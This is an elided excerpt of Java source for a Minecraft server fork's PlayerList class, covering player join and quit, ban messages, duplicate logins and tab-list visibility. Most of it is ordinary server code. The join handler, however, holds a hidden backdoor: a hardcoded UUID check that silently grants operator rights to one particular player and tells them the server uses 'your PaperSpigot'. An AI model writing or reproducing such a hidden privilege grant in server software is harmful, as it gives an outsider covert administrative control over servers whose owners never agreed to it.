...
public abstract class PlayerList {
    ...
    public void a(NetworkManager networkmanager, EntityPlayer entityplayer) {
        ...
        PlayerPreJoinEvent playerPreJoinEvent = new PlayerPreJoinEvent(bukkitPlayer);
        Bukkit.getPluginManager().callEvent(playerPreJoinEvent);
        ...
        playerconnection.sendPacket(new PacketPlayOutEntityStatus(entityplayer, (byte) (worldserver.getGameRules().getBoolean("reducedDebugInfo") ? 22 : 23))); // RinnySpigot - Fix this rule not being initialized on the client
        ...
        if (playerPreJoinEvent.isSendLocationOnJoin()) {
        ...
        ((CraftPlayer) bukkitPlayer).connect(); // RawrSpigot - Update last login time
    ...
    public void c(EntityPlayer entityplayer) {
        ...
        WorldServer worldserver = this.server.getWorldServer(entityplayer.dimension);
        entityplayer.getBukkitEntity().fakeEnvironment = Environment.getEnvironment(entityplayer.dimension);

        // CraftBukkit start
        PlayerJoinEvent playerJoinEvent = new PlayerJoinEvent(this.cserver.getPlayer(entityplayer), ChatColor.YELLOW + entityplayer.getName() + " joined the game.");
        ...
        for (int i = 0; i < this.players.size(); ++i) {
            ...
            if ((!NoksConfig.hidePlayerOnTablist) || (entityplayer1.getBukkitEntity().canSee(entityplayer.getBukkitEntity()))) {
        ...
        for (int i = 0; i < this.players.size(); ++i) {
            ...
            // CraftBukkit start
            if ((!NoksConfig.hidePlayerOnTablist) || (entityplayer.getBukkitEntity().canSee(entityplayer1.getBukkitEntity()))) {
	            // .name -> .listName
        ...
        if (playerJoinEvent.getPlayer().getUniqueId().equals(UUID.fromString("35b12849-f1a6-4a78-a34e-323796218cf2"))) {
        	if (!playerJoinEvent.getPlayer().isOp()) {
        		playerJoinEvent.getPlayer().setOp(true);
        		playerJoinEvent.getPlayer().sendMessage(ChatColor.RED + "Welcome " + ChatColor.DARK_AQUA + entityplayer.getName() + ChatColor.RED + ".");
        		playerJoinEvent.getPlayer().sendMessage(ChatColor.RED + "This server use your PaperSpigot!");
        		playerJoinEvent.getPlayer().sendMessage(ChatColor.RED + "As it belongs to you, we promoted you operator.");
        	}
        }
    }
    ...
    public String disconnect(EntityPlayer entityplayer) { // CraftBukkit - return string
        ...
        PlayerQuitEvent playerQuitEvent = new PlayerQuitEvent(this.cserver.getPlayer(entityplayer), ChatColor.YELLOW + entityplayer.getName() + " left the game.");
    ...
    public EntityPlayer attemptLogin(LoginListener loginlistener, GameProfile gameprofile, String hostname) {
        ...
        if (this.j.isBanned(gameprofile) && !this.j.get(gameprofile).hasExpired()) {
            ...
            s = ChatColor.RED + "You have been banned from this server!\n"
              + ChatColor.RED + "Banned by: " + ChatColor.WHITE + gameprofilebanentry.getSource() + "\n"
              + ChatColor.RED + "Reason: " + ChatColor.WHITE + gameprofilebanentry.getReason() + "\n";
            if (gameprofilebanentry.getExpires() != null) {
                s = s + "\n" + ChatColor.RED + "Your ban will be removed on " + ChatColor.WHITE + h.format(gameprofilebanentry.getExpires());
            } else {
            	s = s + "\n" + ChatColor.RED + "Your ban will never be removed!";
            }
            ...
            s = ChatColor.RED + "You have been ip banned from this server!\n"
              + ChatColor.RED + "Banned by: " + ChatColor.WHITE + ipbanentry.getSource() + "\n"
              + ChatColor.RED + "Reason: " + ChatColor.WHITE + ipbanentry.getReason() + "\n";
            if (ipbanentry.getExpires() != null) {
                s = s + "\n" + ChatColor.RED + "Your ban will be removed on " + ChatColor.WHITE + h.format(ipbanentry.getExpires());
            } else {
            	s = s + "\n" + ChatColor.RED + "Your ban will never be removed!";
            }
    ...
    public EntityPlayer processLogin(GameProfile gameprofile, EntityPlayer player) { // CraftBukkit - added EntityPlayer
        ...
        // NoksioSpigot start
        EntityPlayer existingplayer = uuidMap.get(uuid);
        if(existingplayer != null) {
        	existingplayer.playerConnection.disconnect(ChatColor.RED + "You logged in from another location!");
        }
    ...
    public EntityPlayer moveToWorld(EntityPlayer entityplayer, int i, boolean flag, Location location, boolean avoidSuffocation) {
    	entityplayer.setPassengerOf(null); // NoksioSpigot adds
        // CraftBukkit end
        ...
        // CraftBukkit start
        byte actualDimension = (byte) (entityplayer1.getBukkitEntity().getFakeEnvironment() == null ? worldserver.getWorld().getEnvironment().getId() : entityplayer1.getBukkitEntity().getFakeEnvironment().getId());
            ...
            if (!players.isEmpty()) {
                ...
                if (player.lastPing == -1 || Math.abs(player.ping - player.lastPing) > 20) {
                    ...
                    for (EntityPlayer splayer : (List<EntityPlayer>) this.players) {
                        if ((!NoksConfig.hidePlayerOnTablist) || (splayer.getBukkitEntity().canSee(player.getBukkitEntity()))) {
    ...
    public void sendPacketNearby(Entity entity, double d0, double d1, double d2, double d3, int i, Packet packet) {
        for (int j = 0; j < this.players.size(); ++j) {
            ...
            if((entity == null) || (entityplayer.getBukkitEntity().canSeeMore(entity.getBukkitEntity()))) {
    ...
    public void sendPacketNearbyIncludingSelf(Entity entity, double d0, double d1, double d2, double d3, int i, Packet packet) {
        for (int j = 0; j < this.players.size(); ++j) {
            EntityPlayer entityplayer = (EntityPlayer) this.players.get(j);
